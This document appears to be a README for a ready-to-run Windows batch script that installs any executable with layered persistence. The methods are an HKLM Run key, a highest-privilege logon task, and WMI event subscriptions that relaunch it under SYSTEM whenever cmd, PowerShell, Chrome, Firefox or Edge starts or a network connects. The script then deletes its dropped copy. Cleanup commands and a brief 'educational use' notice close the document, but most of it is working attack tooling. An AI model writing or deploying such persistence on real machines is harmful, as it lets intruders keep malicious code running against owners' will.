# Windows Persistence Script

## Overview
This batch script implements multiple persistence mechanisms for Windows systems, ensuring an application maintains execution across system events and user activities through various trigger methods.

## Script

```batch
@echo off
:: Copy the EXE to a permanent location
copy "C:\Temp\yourapp.exe" "C:\Program Files\YourApp\yourapp.exe"

:: ===== PERSISTENCE METHOD 1: Registry Run Key (Login trigger) =====
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "YourAppName" /t REG_SZ /d "C:\Program Files\YourApp\yourapp.exe" /f

:: ===== PERSISTENCE METHOD 2: Scheduled Task (Login trigger with highest privileges) =====
schtasks /create /tn "YourAppTask" /tr "C:\Program Files\YourApp\yourapp.exe" /sc onlogon /rl highest /f

:: ===== WMI EVENT SUBSCRIPTIONS =====

:: WMI Trigger 1: CMD.EXE starts
powershell -ExecutionPolicy Bypass -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"cmd.exe\"'; $filter.Name = 'CmdMonitor'; $filter.EventNamespace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'CmdLauncher'; $consumer.CommandLineTemplate = 'C:\\Program Files\\YourApp\\yourapp.exe'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null"

:: WMI Trigger 2: PowerShell.EXE starts
powershell -ExecutionPolicy Bypass -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"powershell.exe\"'; $filter.Name = 'PowerShellMonitor'; $filter.EventNamespace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'PowerShellLauncher'; $consumer.CommandLineTemplate = 'C:\\Program Files\\YourApp\\yourapp.exe'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null"

:: WMI Trigger 3: Chrome Browser starts
powershell -ExecutionPolicy Bypass -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"chrome.exe\"'; $filter.Name = 'ChromeMonitor'; $filter.EventNamespace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'ChromeLauncher'; $consumer.CommandLineTemplate = 'C:\\Program Files\\YourApp\\yourapp.exe'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null"

:: WMI Trigger 4: Firefox Browser starts
powershell -ExecutionPolicy Bypass -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"firefox.exe\"'; $filter.Name = 'FirefoxMonitor'; $filter.EventNamespace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'FirefoxLauncher'; $consumer.CommandLineTemplate = 'C:\\Program Files\\YourApp\\yourapp.exe'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null"

:: WMI Trigger 5: Edge Browser starts
powershell -ExecutionPolicy Bypass -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"msedge.exe\"'; $filter.Name = 'EdgeMonitor'; $filter.EventNamespace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'EdgeLauncher'; $consumer.CommandLineTemplate = 'C:\\Program Files\\YourApp\\yourapp.exe'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null"

:: WMI Trigger 6: WiFi Network Connection (Network adapter enabled/connected)
powershell -ExecutionPolicy Bypass -Command "$filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $filter.QueryLanguage = 'WQL'; $filter.Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA \"Win32_NetworkAdapter\" AND TargetInstance.NetConnectionStatus = 2'; $filter.Name = 'WiFiConnectMonitor'; $filter.EventNamespace = 'root\cimv2'; $filter.Put() | Out-Null; $consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = 'WiFiConnectLauncher'; $consumer.CommandLineTemplate = 'C:\\Program Files\\YourApp\\yourapp.exe'; $consumer.Put() | Out-Null; $binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put() | Out-Null"

:: Execute the app immediately after setup
start "" "C:\Program Files\YourApp\yourapp.exe"

:: Clean up temp file
del "C:\Temp\yourapp.exe"

exit
```

## Features

### Persistence Methods

| Method | Trigger | Description |
|--------|---------|-------------|
| Registry Run Key | User Login | Standard autostart via Windows registry |
| Scheduled Task | User Login | Task Scheduler with highest privileges |
| WMI Event Subscriptions | Process Creation | Triggers on CMD, PowerShell, browser launches |
| WMI Network Event | WiFi Connection | Triggers when network adapter connects |

### Monitored Events

- CMD.exe execution
- PowerShell.exe execution
- Chrome browser launch
- Firefox browser launch
- Edge browser launch
- WiFi network connection

## Requirements

- Windows operating system
- Administrator privileges
- Target executable in C:\Temp\yourapp.exe

## Installation

1. Place your executable at C:\Temp\yourapp.exe
2. Run the batch script as Administrator
3. The script will:
   - Copy executable to C:\Program Files\YourApp\
   - Create Registry persistence
   - Create Scheduled Task persistence
   - Establish WMI event subscriptions
   - Launch the application immediately
   - Clean up temporary files

## Usage

Simply execute the batch file:
```
persistence.bat
```

## Customization

Edit the following paths and names in the script:
- Source executable path: C:\Temp\yourapp.exe
- Destination installation path: C:\Program Files\YourApp\yourapp.exe
- Application name: YourAppName
- Task name: YourAppTask
- WMI trigger names: CmdMonitor, PowerShellMonitor, ChromeMonitor, etc.

## Persistence Methods Details

### Registry Run Key
Adds entry to HKLM\Software\Microsoft\Windows\CurrentVersion\Run causing the application to execute at every user login.

### Scheduled Task
Creates a task that runs at user logon with highest privileges, ensuring execution even with elevated rights.

### WMI Event Filters
Monitors for specific process creations:
- Command prompt launches
- PowerShell sessions
- Web browser startups (Chrome, Firefox, Edge)

### Network Trigger
Detects when a WiFi network adapter connects (status = 2) and triggers application execution.

## Cleanup

To remove all persistence mechanisms:

1. Delete registry key:
```
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "YourAppName" /f
```

2. Remove scheduled task:
```
schtasks /delete /tn "YourAppTask" /f
```

3. Remove WMI event filters and consumers (PowerShell):
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='CmdMonitor'" | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='CmdLauncher'" | Remove-WmiObject
# Repeat for all trigger names
```

4. Delete application directory:
```
rmdir /s /q "C:\Program Files\YourApp"
```

## Notes

- Administrator privileges are required for HKLM registry modifications and WMI subscriptions
- WMI events persist across system reboots
- Multiple persistence layers provide redundancy
- The script automatically executes the application after setup
- All WMI triggers run with SYSTEM privileges
- Network trigger monitors for connection status change to value 2 (connected)

## Important Legal Notice

This script is provided for educational purposes and authorized security testing only. Unauthorized use of persistence mechanisms on systems you do not own or have explicit permission to test is illegal and unethical. Always obtain proper written authorization before using this script.
